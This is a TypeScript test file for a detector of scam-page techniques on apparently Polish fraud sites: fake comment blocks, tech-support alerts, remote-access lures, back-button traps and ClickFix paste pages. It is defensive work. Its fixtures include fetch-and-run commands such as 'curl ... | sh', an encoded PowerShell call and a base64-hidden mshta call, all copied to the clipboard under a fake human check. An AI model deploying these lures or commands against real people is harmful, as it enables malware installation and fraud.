import { describe, expect, it } from "vitest";
import { createHash } from "node:crypto";
import { antiDevtools, kitFamilies, scarcityCounter, backTrap, clickfixPaste, commentBlock, detectPageTechniques, fakeAppStore, fakeSecurityAlert, fakeSocialPost, normaliseAuthor, remoteAccessTool } from "./pageTechniques";

const comment = (author: string, text: string) =>
  `<div class="fb-comment"><img class="avatar" src="a.jpg"><div class="comment-main"><span class="comment-author">${author}</span><p class="comment-text">${text}</p><span class="meta-action">Lubię to</span> · <span class="meta-action">Odpowiedz</span> · 2 godz. temu</div></div>`;
const BLOCK = [
  comment("Jan Przykładowy · Kraków", "Wpłaciłem 1000 zł i po tygodniu mam więcej."),
  comment("Anna Testowa", "Na początku nie wierzyłam, ale działa."),
  comment("Piotr Fikcyjny", "Gdzie się zapisać?"),
  comment("Anna Testowa", "Tutaj, link w artykule."),
].join("\n");
const page = (body: string, head = "") => `<html><head><title>Wiadomości</title>${head}</head><body><article><p>Artykuł</p></article><section class="comments"><h3>Komentarze</h3>${body}</section></body></html>`;

describe("commentBlock", () => {
  it("reads the authors of a block written into the page and keys it by the author set", () => {
    const b = commentBlock(page(BLOCK))!;
    expect(b.count).toBe(4);
    expect(b.authors).toEqual(["jan przykładowy", "anna testowa", "piotr fikcyjny"]);
    expect(b.samples[0]).toContain("Wpłaciłem");
    // the same people in another order, on another page: the same block
    const other = commentBlock(page([comment("Piotr Fikcyjny", "x"), comment("Anna Testowa", "y"), comment("Jan Przykładowy", "z")].join("")))!;
    expect(other.key).toBe(b.key);
    expect(other.key).toMatch(/^[0-9a-f]{16}$/);
  });

  it("ignores the real comments plugin, a single testimonial and name fields outside comments", () => {
    const real = `<div class="fb-comments" data-href="https://news.example/a"></div><script src="https://connect.facebook.net/pl_PL/sdk.js"></script>`;
    expect(commentBlock(page(BLOCK + real))).toBeNull();
    expect(commentBlock(page(comment("Jan Przykładowy", "Polecam") + comment("Anna Testowa", "Ja też")))).toBeNull();
    expect(commentBlock(`<form><span class="name">Polska</span><span class="name">Czechy</span><span class="name">Niemcy</span></form>`)).toBeNull();
  });

  it("does not tie two pages by one or two shared common names", () => {
    const one = commentBlock(page([comment("Piotr Fikcyjny", "a"), comment("Ewa Zmyślona", "b"), comment("Adam Wymyślony", "c")].join("")))!;
    const two = commentBlock(page([comment("Piotr Fikcyjny", "a"), comment("Anna Testowa", "b"), comment("Marek Nieistniejący", "c")].join("")))!;
    const three = commentBlock(page([comment("Piotr Fikcyjny", "a"), comment("Anna Testowa", "b"), comment("Olga Przykładowa", "c")].join("")))!;
    expect(new Set([commentBlock(page(BLOCK))!.key, one.key, two.key, three.key]).size).toBe(4);
  });

  it("does not read a country list of a form (select/option) as a comment block", () => {
    const countries = Array.from({ length: 30 }, (_, i) => `<option value="k${i}">Kraj Testowy ${String.fromCharCode(65 + (i % 26))}${i}</option>`).join("");
    expect(commentBlock(`<html><body><form action="/zapis"><label>Imię<input name="name"></label><select name="country">${countries}</select><button>Wyślij</button></form></body></html>`)).toBeNull();
    // the same list as the author field of reply forms under comments
    const named = ["Polska", "Czechy", "Niemcy", "Słowacja", "Litwa", "Łotwa"].map((c) => `<option class="user-name">${c}</option>`).join("");
    const replyForm = `<div class="comment-item"><form><select class="user-name" name="country">${named}</select><textarea class="comment-text"></textarea></form></div>`;
    expect(commentBlock(page(replyForm.repeat(3)))).toBeNull();
  });

  it("normalises author names", () => {
    expect(normaliseAuthor("  Jan  Przykładowy · Łódź ")).toBe("jan przykładowy");
    expect(normaliseAuthor("Zespół Marki Testowej")).toBe("zespół marki testowej");
    expect(normaliseAuthor("12345678")).toBeNull();
    expect(normaliseAuthor("x")).toBeNull();
  });
});

describe("techniques", () => {
  it("finds a back-button trap", () => {
    expect(backTrap(`<script>for (var i = 0; i < 20; i++) { history.pushState(null, "", location.href); } window.onpopstate = function () { location.href = "https://dalej.example/"; };</script>`)).toBe(true);
    expect(backTrap(`<script src="/js/back-nav.js"></script>`)).toBe(true);
    expect(backTrap(`<script>history.pushState({}, "", "/krok-2");</script>`)).toBe(false);
  });

  it("finds a fake app store on a host that is not a store", () => {
    const store = `<html><head><title>App Store – Gra Testowa</title></head><body><div class="ios-get-button">POBIERZ</div><p>Wybór redakcji</p><p>Zakupy w aplikacji</p></body></html>`;
    expect(fakeAppStore(store, "https://sklep-gier.example/app")).toBe(true);
    expect(fakeAppStore(store, "https://apps.apple.com/pl/app/x/id1")).toBe(false);
    // a "download on the App Store" badge is not a store page
    expect(fakeAppStore(`<html><head><title>Bank Testowy</title></head><body><a class="badge" href="https://apps.apple.com/">App Store</a></body></html>`, "https://bank.example/")).toBe(false);
  });

  it("finds a social post written as static HTML, not an embed", () => {
    expect(fakeSocialPost(`<!-- X-POST: wywiad --><div class="x-post"><img src="avatar.jpg"><span>@konto</span></div>`)).toBe(true);
    expect(fakeSocialPost(`<blockquote class="twitter-tweet"><a href="https://x.com/konto/status/1">x</a></blockquote><script src="https://platform.twitter.com/widgets.js"></script><div class="tweet"></div>`)).toBe(false);
    expect(fakeSocialPost(`<div class="post-title">Artykuł</div>`)).toBe(false);
  });

  it("lists the techniques of a page", () => {
    const html = page(BLOCK, `<script>window.onpopstate=()=>{};history.pushState(1,"");history.pushState(2,"");</script>`);
    const t = detectPageTechniques(html, "https://wiadomosci.example/a");
    expect(t.techniques).toEqual(["back_trap", "fake_comments"]);
    expect(t.commentBlock?.count).toBe(4);
    expect(detectPageTechniques("", "https://x.example/")).toEqual({ techniques: [], commentBlock: null, clickfix: null });
  });
});

const alertPage = (body: string, script = "") => `<html><head><title>Ostrzeżenie</title></head><body>${body}<script>${script}</script></body></html>`;

describe("fakeSecurityAlert (tech-support funnel)", () => {
  it("needs an alarm phrase, a phone number as the call to action and a mechanism that holds the visitor", () => {
    const alert = `<h1>Windows Defender: wirus wykryty</h1><p>Twój komputer został zablokowany. Zadzwoń natychmiast: +48 800 000 000</p>`;
    const hold = `window.onbeforeunload = function () { return "Nie opuszczaj strony"; }; document.documentElement.requestFullscreen();`;
    expect(fakeSecurityAlert(alertPage(alert, hold))).toBe(true);
    expect(detectPageTechniques(alertPage(alert, hold), "https://pomoc.example/").techniques).toContain("fake_security_alert");
    // no number, no call to action
    expect(fakeSecurityAlert(alertPage("<h1>Windows Defender: wirus wykryty</h1><p>Twój komputer został zablokowany.</p>", hold))).toBe(false);
    // no holding mechanism: a blog post about viruses with a helpline in it
    expect(fakeSecurityAlert(alertPage(alert))).toBe(false);
  });

  it("reads a tel: link next to the alarm phrase and the English and German wording", () => {
    const en = `<h1>Critical error: your computer has been locked</h1><a href="tel:+44 800 000 0000">Call Microsoft support</a>`;
    expect(fakeSecurityAlert(alertPage(en, `for (;;) { alert("Virus detected"); }`))).toBe(true);
    const de = `<h1>Ihr Computer wurde gesperrt – Virus erkannt</h1><a href="tel:+49 800 000 0000">Jetzt anrufen</a>`;
    expect(fakeSecurityAlert(alertPage(de, `window.onbeforeunload = () => "x";`))).toBe(true);
  });

  it("does not take a shop with a phone link in the footer", () => {
    const shop = `<h1>Sklep testowy</h1><p>Darmowa dostawa</p><footer><a href="tel:+48 800 000 000">+48 800 000 000</a></footer>`;
    expect(fakeSecurityAlert(alertPage(shop, `window.onbeforeunload = () => "Czy na pewno?";`))).toBe(false);
  });
});

describe("remoteAccessTool", () => {
  it("finds a download link of a remote-desktop tool with an access-code instruction", () => {
    const page = `<p>Pobierz program, uruchom i podaj kod technikowi.</p><a href="https://anydesk.example.test/x">AnyDesk</a><a href="https://anydesk.com/download">Pobierz</a>`;
    expect(remoteAccessTool(page, "https://pomoc.example/")).toBe(true);
    expect(detectPageTechniques(page, "https://pomoc.example/").techniques).toContain("remote_access_tool");
  });

  it("finds an instruction without a link and ignores the tool's own site and a plain mention", () => {
    expect(remoteAccessTool(`<p>Zainstaluj TeamViewer QuickSupport i podaj nam 9-cyfrowy kod dostępu.</p>`, "https://pomoc.example/")).toBe(true);
    expect(remoteAccessTool(`<a href="https://anydesk.com/download">Download</a>`, "https://anydesk.com/")).toBe(false);
    expect(remoteAccessTool(`<p>Porównanie programów: TeamViewer, AnyDesk, RustDesk.</p>`, "https://blog.example/")).toBe(false);
  });
});

describe("clickfixPaste", () => {
  const verify = `<h1>Verify you are human</h1><p>Naciśnij Win+R, wklej (Ctrl+V) i naciśnij Enter, aby udowodnić, że nie jesteś robotem.</p>`;
  const copy = (cmd: string) => `<script>navigator.clipboard.writeText(${JSON.stringify(cmd)});</script>`;

  it("finds a fake verification that copies a command and tells the visitor to paste it, keeping only kind and hash", () => {
    const cmd = "powershell -enc AAAA";
    const r = clickfixPaste(`<html><body>${verify}${copy(cmd)}</body></html>`)!.command;
    expect(r).toEqual({ kind: "powershell", sha256: createHash("sha256").update(cmd).digest("hex") });
    expect(JSON.stringify(r)).not.toContain("AAAA");
    expect(detectPageTechniques(`<html><body>${verify}${copy(cmd)}</body></html>`, "https://x.example/").techniques).toContain("clickfix_paste");
  });

  it("gives the same hash to the same command whatever the spacing", () => {
    const a = clickfixPaste(`${verify}${copy("curl -s https://a.example/x   | sh")}`)!.command!;
    const b = clickfixPaste(`${verify}${copy("curl -s https://a.example/x | sh")}`)!.command!;
    expect(a.kind).toBe("curl_pipe_shell");
    expect(a.sha256).toBe(b.sha256);
  });

  it("reads a command hidden behind atob and a shortcut instruction without a script as a technique with no hash", () => {
    const b64 = Buffer.from("mshta https://c.example/p").toString("base64");
    const r = clickfixPaste(`${verify}<script>navigator.clipboard.writeText(atob("${b64}"))</script>`)!.command!;
    expect(r.kind).toBe("mshta");
    expect(r.sha256).toBe(createHash("sha256").update("mshta https://c.example/p").digest("hex"));
    expect(clickfixPaste(verify)).toEqual({ command: null });
    expect(detectPageTechniques(`<html><body>${verify}</body></html>`, "https://x.example/").techniques).toContain("clickfix_paste");
  });

  it("does not take a real reCAPTCHA, a docs page with a copy button or a shortcut tutorial", () => {
    expect(clickfixPaste(`<div class="g-recaptcha" data-sitekey="k"></div><p>Verify you are human</p>`)).toBeNull();
    expect(clickfixPaste(`<h1>Instalacja</h1><button onclick="navigator.clipboard.writeText('powershell -File setup.ps1')">Kopiuj</button>`)).toBeNull();
    expect(detectPageTechniques(`<h1>Skróty</h1><p>Win+R otwiera okno Uruchom.</p>`, "https://x.example/").techniques).not.toContain("clickfix_paste");
  });
});

describe("scarcity, devtools blocking and kit families (B-346, B-340, B-348)", () => {
  it("reads a pressure counter from text or OCR, not a plain number", () => {
    expect(scarcityCounter("LICZBA POZOSTAŁYCH MIEJSC 99")).toBe(true);
    expect(scarcityCounter("Zostało tylko 7 sztuk w magazynie")).toBe(true);
    expect(scarcityCounter("Mamy 99 klientów i 7 sklepów")).toBe(false);
  });

  it("finds a script that blocks F12 and the context menu", () => {
    const js = `<script>document.addEventListener("keydown",e=>{if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&e.keyCode==73))e.preventDefault()});document.addEventListener("contextmenu",e=>e.preventDefault())</script>`;
    expect(antiDevtools(js)).toBe(true);
    expect(antiDevtools(`<script>if(e.keyCode==13)submit()</script>`)).toBe(false);
    expect(detectPageTechniques(js, "https://x.example/").techniques).toContain("anti_devtools");
  });

  it("names the kit family from classes, field markers or hidden fields", () => {
    expect(kitFamilies(`<form class="formFb__wrap"></form>`)).toEqual(["formFb"]);
    expect(kitFamilies(`<script>var oldPriceAndLabelForLandingInfoApi = 1;</script>`)).toEqual(["formFb"]);
    const hidden = ["sid", "x_id", "sub1", "fbtoken"].map((n) => `<input type="hidden" name="${n}">`).join("");
    expect(detectPageTechniques(`<form>${hidden}</form>`, "https://x.example/").techniques).toContain("kit:formFb");
    expect(kitFamilies(`<form class="contact"><input type="hidden" name="sid"></form>`)).toEqual([]);
  });
});
